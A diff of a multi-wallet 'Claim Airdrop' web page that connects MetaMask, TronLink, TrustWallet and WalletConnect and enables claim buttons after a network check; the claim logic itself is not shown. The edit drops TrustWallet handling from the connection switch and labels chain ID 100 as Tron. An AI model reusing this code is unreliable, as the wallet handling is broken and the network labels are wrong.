@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wallet Integration</title>
     <link rel="stylesheet" href="css/styles.css">
+    
+    <!-- External scripts for wallet integrations -->
     <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
     <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.7.0/dist/umd/index.min.js"></script>
@@ -18,23 +20,23 @@
     <h2>MetaMask (ETH/BSC)</h2>
     <p>Connect your MetaMask wallet to claim airdrop on Ethereum or Binance Smart Chain.</p>
     <button id="connectMetaMaskButton">Connect MetaMask</button>
-    <button id="claimMetaMaskAirdropButton" disabled>Claim Airdrop (ETH/BSC)</button>
+    <button id="claimAirdropButton" disabled>Claim Airdrop (ETH/BSC)</button>
 </section>
 
 <!-- TronLink Section -->
 <section id="tronlink-section">
     <h2>TronLink (Tron)</h2>
     <p>Connect your TronLink wallet to claim airdrop on Tron network.</p>
-    <button id="connectTronLinkButton">Connect TronLink</button>
-    <button id="claimTronLinkAirdropButton" disabled>Claim Airdrop (Tron)</button>
+    <button id="connectTronlinkButton">Connect TronLink</button>
+    <button id="claimTronAirdropButton" disabled>Claim Airdrop (Tron)</button>
 </section>
 
 <!-- TrustWallet Section -->
 <section id="trustwallet-section">
     <h2>TrustWallet (BSC)</h2>
     <p>Connect your TrustWallet wallet to claim airdrop on Binance Smart Chain.</p>
-    <button id="connectTrustWalletButton">Connect TrustWallet</button>
-    <button id="claimTrustWalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
+    <button id="connectTrustwalletButton">Connect TrustWallet</button>
+    <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
 </section>
 
 <!-- WalletConnect Section -->
@@ -53,7 +55,6 @@
         script.onload = callback;
         script.onerror = function(error) {
             console.error("Error loading script:", src, error);
-            alert(`Failed to load ${src}`);
         };
         document.head.appendChild(script);
     }
@@ -77,12 +78,14 @@
         }
     }
 
-    // MetaMask connection logic
+    // MetaMask Connection Logic
     function connectMetaMask(config, abi, expectedChainIds) {
         if (window.ethereum) {
             const web3 = new Web3(window.ethereum);
             window.ethereum.request({ method: 'eth_requestAccounts' }).then(async (accounts) => {
                 console.log("Connected to MetaMask:", accounts);
+
+                // Check if the wallet is on the correct network
                 await checkNetworkAndEnableClaimButton(web3, expectedChainIds);
             }).catch((error) => {
                 console.error("MetaMask connection failed:", error);
@@ -93,21 +96,22 @@
         }
     }
 
-    // TronLink connection logic
+    // TronLink Connection Logic
     function connectTronLink(config, abi, expectedChainIds) {
         if (window.tronLink) {
             try {
                 const tronAddress = window.tronLink.defaultAddress.base58;
                 if (tronAddress) {
                     console.log("Connected to TronLink:", tronAddress);
+
                     window.tronLink.request({ method: 'tron_getNetworkType' })
                         .then((network) => {
                             console.log("Current TronLink network:", network);
                             if (network === 'mainnet') {
-                                document.getElementById('claimTronLinkAirdropButton').disabled = false;
+                                document.getElementById('claimTronAirdropButton').disabled = false;
                             } else {
                                 alert("Please switch to the Tron mainnet.");
-                                document.getElementById('claimTronLinkAirdropButton').disabled = true;
+                                document.getElementById('claimTronAirdropButton').disabled = true;
                             }
                         }).catch((error) => {
                             console.error("Error getting Tron network:", error);
@@ -117,13 +121,14 @@
                 }
             } catch (error) {
                 alert("Failed to connect to TronLink.");
+                console.error("Error connecting to TronLink:", error);
             }
         } else {
             alert("TronLink wallet is not installed.");
         }
     }
 
-    // WalletConnect connection logic
+    // WalletConnect Connection Logic
     function connectWalletConnect(config, abi, expectedChainIds) {
         const provider = new WalletConnectProvider({
             rpc: {
@@ -137,6 +142,7 @@
             const web3 = new Web3(provider);
             const accounts = await web3.eth.getAccounts();
             console.log("Connected to WalletConnect:", accounts);
+
             await checkNetworkAndEnableClaimButton(web3, expectedChainIds);
         }).catch((error) => {
             console.error("WalletConnect connection failed:", error);
@@ -144,65 +150,62 @@
         });
     }
 
-    // Unified Wallet Connection Handler
+    // Add event listeners for each button
+    document.addEventListener('DOMContentLoaded', function () {
+        // MetaMask Button
+        document.getElementById('connectMetaMaskButton').addEventListener('click', function () {
+            handleWalletConnection('metamask', 'eth', [1, 56]);  // Ethereum and BSC chain IDs
+        });
+
+        // TronLink Button
+        document.getElementById('connectTronlinkButton').addEventListener('click', function () {
+            handleWalletConnection('tronlink', 'tron', [100]);  // Tron chain ID
+        });
+
+        // TrustWallet Button
+        document.getElementById('connectTrustwalletButton').addEventListener('click', function () {
+            handleWalletConnection('trustwallet', 'bsc', [56]);  // BSC chain ID
+        });
+
+        // WalletConnect Button
+        document.getElementById('connectWalletConnectButton').addEventListener('click', function () {
+            handleWalletConnection('walletconnect', 'eth', [1, 56, 100]);  // ETH, BSC, Tron chain IDs
+        });
+    });
+
+    // Function to handle wallet connection
     function handleWalletConnection(wallet, network, expectedChainIds) {
-        const scriptPaths = {
-            metamask: 'js/metamask.js',
-            tronlink: 'js/tronlink.js',
-            trustwallet: 'js/trustwallet.js',
-            walletconnect: 'js/walletconnect.js',
-        };
-
-        const walletScript = scriptPaths[wallet];
-
-        if (walletScript) {
-            loadScript(walletScript, () => {
-                console.log(`${walletScript} script loaded successfully.`);
-
-                // Load config and ABI dynamically
-                loadConfigAndABI(network).then(({ config, abi }) => {
-                    if (config && abi) {
-                        switch (wallet) {
-                            case 'metamask':
-                                connectMetaMask(config, abi, expectedChainIds);
-                                break;
-                            case 'tronlink':
-                                connectTronLink(config, abi, expectedChainIds);
-                                break;
-                            case 'trustwallet':
-                                connectTrustWallet(config, abi, expectedChainIds);
-                                break;
-                            case 'walletconnect':
-                                connectWalletConnect(config, abi, expectedChainIds);
-                                break;
-                        }
-                    }
-                });
-            });
-        } else {
-            console.error(`No script found for wallet: ${wallet}`);
-        }
+        loadConfigAndABI(network).then(({ config, abi }) => {
+            if (config && abi) {
+                switch (wallet) {
+                    case 'metamask':
+                        connectMetaMask(config, abi, expectedChainIds);
+                        break;
+                    case 'tronlink':
+                        connectTronLink(config, abi, expectedChainIds);
+                        break;
+                    case 'walletconnect':
+                        connectWalletConnect(config, abi, expectedChainIds);
+                        break;
+                }
+            }
+        });
     }
 
-    // MetaMask Button logic (within MetaMask section)
-    document.getElementById('connectMetaMaskButton').addEventListener('click', function () {
-        handleWalletConnection('metamask', 'eth', [1, 56]);  // Ethereum and BSC chain IDs
-    });
-
-    // TronLink Button logic (within TronLink section)
-    document.getElementById('connectTronLinkButton').addEventListener('click', function () {
-        handleWalletConnection('tronlink', 'tron', [100]);  // Tron chain ID
-    });
-
-    // TrustWallet Button logic (within TrustWallet section)
-    document.getElementById('connectTrustWalletButton').addEventListener('click', function () {
-        handleWalletConnection('trustwallet', 'bsc', [56]);  // BSC chain ID
-    });
-
-    // WalletConnect Button logic (within WalletConnect section)
-    document.getElementById('connectWalletConnectButton').addEventListener('click', function () {
-        handleWalletConnection('walletconnect', 'eth', [1, 56, 100]);  // ETH, BSC, Tron chain IDs
-    });
+    // Network checking function
+    async function checkNetworkAndEnableClaimButton(web3, expectedChainIds) {
+        try {
+            const currentChainId = await web3.eth.getChainId();
+            if (expectedChainIds.includes(currentChainId)) {
+                document.getElementById('claimAirdropButton').disabled = false;
+            } else {
+                alert("Please switch to the correct network.");
+                document.getElementById('claimAirdropButton').disabled = true;
+            }
+        } catch (error) {
+            console.error("Error checking network:", error);
+        }
+    }
 </script>
 
 </body>
